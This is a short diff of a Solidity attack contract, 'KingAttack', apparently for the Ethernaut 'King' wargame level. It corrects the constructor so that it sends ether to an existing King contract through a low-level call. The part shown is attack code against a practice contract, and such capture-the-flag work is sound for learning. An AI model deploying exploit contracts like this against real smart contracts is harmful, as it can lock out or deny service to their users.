@@ -6,8 +6,9 @@ import "./King.sol";
 contract KingAttack {
     King king;
 
-    constructor(address kingContractAddress) public payable {
-        king = new King(kingContractAddress);
-        king.call{value: msg.value};
+    constructor(address payable _kingContractAddress) public payable {
+        king = King(_kingContractAddress);
+        (bool success, ) = address(king).call{value: msg.value}("");
+        require(success, "King call failed");
     }
 }
